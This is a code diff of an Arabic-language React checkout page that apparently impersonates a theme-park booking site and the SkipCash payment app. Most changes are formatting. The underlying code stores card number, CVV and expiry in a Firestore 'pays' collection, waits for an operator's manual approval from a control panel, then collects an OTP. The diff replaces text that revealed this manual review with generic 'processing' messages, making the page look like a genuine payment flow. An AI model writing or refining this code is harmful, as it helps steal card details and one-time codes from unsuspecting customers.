@@ -1,5 +1,11 @@
 import { useEffect, useMemo, useRef, useState } from "react";
-import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
+import {
+  AlertCircle,
+  Check,
+  CreditCard,
+  Loader2,
+  ShieldCheck,
+} from "lucide-react";
 import { doc, onSnapshot } from "firebase/firestore";
 import {
   onDisconnect,
@@ -118,12 +124,7 @@ function isCardExpired(expiry: string): boolean {
   const month = Number(monthPart);
   const year = Number(yearPart);
 
-  if (
-    Number.isNaN(month) ||
-    Number.isNaN(year) ||
-    month < 1 ||
-    month > 12
-  ) {
+  if (Number.isNaN(month) || Number.isNaN(year) || month < 1 || month > 12) {
     return true;
   }
 
@@ -221,7 +222,10 @@ function generateSubmissionId(existingSubmissionId: string | null): string {
     return existingSubmissionId;
   }
 
-  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
+  if (
+    typeof crypto !== "undefined" &&
+    typeof crypto.randomUUID === "function"
+  ) {
     return crypto.randomUUID();
   }
 
@@ -238,7 +242,9 @@ function ensureVisitorId(): string {
     return existing;
   }
 
-  const generated = `visitor-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  const generated = `visitor-${Date.now()}-${Math.random()
+    .toString(36)
+    .slice(2, 8)}`;
   window.localStorage.setItem("visitor", generated);
   return generated;
 }
@@ -326,9 +332,7 @@ export default function Checkout() {
   const subtotal = useMemo(() => getOrderSubtotal(orderItems), [orderItems]);
 
   const visitDate = parseStoredDate(storedCart.visitDateIso);
-  const bookingDateText = visitDate
-    ? formatArabicDate(visitDate)
-    : "غير محدد";
+  const bookingDateText = visitDate ? formatArabicDate(visitDate) : "غير محدد";
   const visitTime = storedCart.visitTime ?? "١٧:٣٠ - ٢٣:٥٩";
   const cardPreviewNumber = getCardPreviewNumber(cardDetails.cardNumber);
   const cardPreviewName =
@@ -400,31 +404,34 @@ export default function Checkout() {
       return;
     }
 
-    const unsubscribe = onSnapshot(doc(db, "pays", submissionId), (snapshot) => {
-      if (!snapshot.exists()) {
-        return;
-      }
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", submissionId),
+      (snapshot) => {
+        if (!snapshot.exists()) {
+          return;
+        }
 
-      const liveData = snapshot.data() as {
-        payment?: { status?: string; errorMessage?: string | null };
-      };
-      const liveStatus = liveData.payment?.status;
+        const liveData = snapshot.data() as {
+          payment?: { status?: string; errorMessage?: string | null };
+        };
+        const liveStatus = liveData.payment?.status;
 
-      if (liveStatus === "approved") {
-        setPaymentError(null);
-        setPaymentStep((currentStep) =>
-          currentStep === "waitingApproval" ? "otp" : currentStep
-        );
-        return;
-      }
+        if (liveStatus === "approved") {
+          setPaymentError(null);
+          setPaymentStep((currentStep) =>
+            currentStep === "waitingApproval" ? "otp" : currentStep
+          );
+          return;
+        }
 
-      if (liveStatus === "rejected") {
-        setPaymentStep("rejected");
-        setPaymentError(
-          liveData.payment?.errorMessage ?? "تم رفض البطاقة من فريق الدفع."
-        );
+        if (liveStatus === "rejected") {
+          setPaymentStep("rejected");
+          setPaymentError(
+            liveData.payment?.errorMessage ?? "البطاقة غير صالحة"
+          );
+        }
       }
-    });
+    );
 
     return () => {
       unsubscribe();
@@ -473,8 +480,7 @@ export default function Checkout() {
           setOtpCode(otpFromSms);
         }
       })
-      .catch(() => {
-      });
+      .catch(() => {});
 
     return () => {
       abortController.abort();
@@ -609,8 +615,7 @@ export default function Checkout() {
                 errorMessage: failureMessage,
               },
             });
-          } catch {
-          }
+          } catch {}
         }
 
         setPaymentStep("otpFailed");
@@ -673,9 +678,7 @@ export default function Checkout() {
             </div>
             <div
               className={`mx-3 h-[2px] w-12 sm:w-20 ${
-                currentStep >= 2
-                  ? "bg-[hsl(var(--quest-purple))]"
-                  : "bg-[#ddd]"
+                currentStep >= 2 ? "bg-[hsl(var(--quest-purple))]" : "bg-[#ddd]"
               }`}
             />
             <div className="flex items-center gap-2">
@@ -718,7 +721,10 @@ export default function Checkout() {
                       تفاصيل الفاتورة
                     </h2>
 
-                    <form className="mt-4 grid gap-3 sm:grid-cols-2" onSubmit={(e) => e.preventDefault()}>
+                    <form
+                      className="mt-4 grid gap-3 sm:grid-cols-2"
+                      onSubmit={(e) => e.preventDefault()}
+                    >
                       <label className="block">
                         <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                           الاسم الأول <span className="text-[#bf2828]">*</span>
@@ -905,8 +911,8 @@ export default function Checkout() {
                     </div>
 
                     <p className="mt-3 text-xs leading-5 text-[#444]">
-                      SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع
-                      لكل من العملاء والتجار.
+                      SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة
+                      الدفع لكل من العملاء والتجار.
                     </p>
 
                     <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
@@ -1015,7 +1021,10 @@ export default function Checkout() {
                             onChange={(event) =>
                               setCardDetails((current) => ({
                                 ...current,
-                                cvv: toDigitsOnly(event.target.value).slice(0, 4),
+                                cvv: toDigitsOnly(event.target.value).slice(
+                                  0,
+                                  4
+                                ),
                               }))
                             }
                             className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
@@ -1029,10 +1038,7 @@ export default function Checkout() {
                     {paymentStep === "waitingApproval" ? (
                       <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                         <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
-                        <p>
-                          تم إرسال بيانات البطاقة. الرجاء الانتظار حتى موافقة فريق
-                          المراجعة من لوحة التحكم.
-                        </p>
+                        <p>جاري معالجة البطاقة</p>
                       </div>
                     ) : null}
 
@@ -1045,7 +1051,8 @@ export default function Checkout() {
 
                         <label className="mt-2 block">
                           <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                            أدخل رمز OTP <span className="text-[#bf2828]">*</span>
+                            أدخل رمز OTP{" "}
+                            <span className="text-[#bf2828]">*</span>
                           </span>
                           <input
                             ref={otpInputRef}
@@ -1087,8 +1094,8 @@ export default function Checkout() {
                     ) : null}
 
                     <p className="mt-4 text-xs leading-5 text-[#666]">
-                      سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا
-                      الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
+                      سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في
+                      هذا الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
                     </p>
 
                     <div className="mt-4 flex flex-col gap-2 sm:flex-row-reverse">
@@ -1103,9 +1110,9 @@ export default function Checkout() {
                         className="w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70 sm:w-auto sm:px-10"
                       >
                         {isSavingCheckout
-                          ? "جاري حفظ الطلب..."
+                          ? "جاري معالجة الطلب..."
                           : paymentStep === "waitingApproval"
-                          ? "بانتظار الموافقة..."
+                          ? "جاري معالجة الدفع..."
                           : "المتابعة للدفع"}
                       </button>
                       <button
